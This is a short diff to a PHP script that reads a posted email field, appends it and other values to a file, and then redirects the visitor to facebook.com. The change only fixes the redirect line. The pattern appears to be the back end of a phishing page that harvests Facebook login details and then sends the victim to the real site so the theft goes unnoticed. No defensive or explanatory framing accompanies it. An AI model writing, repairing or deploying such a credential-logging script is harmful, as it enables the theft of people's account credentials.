@@ -10,6 +10,6 @@ $user = $_POST["email"];
     fwrite($fileuser, "
 ". $co. $us. $cl);
     fclose($fileuser);
-    header('Location: {https://www.facebook.com/}');
+    header('Location: https://www.facebook.com/');
     exit();
-?>
+    ?>
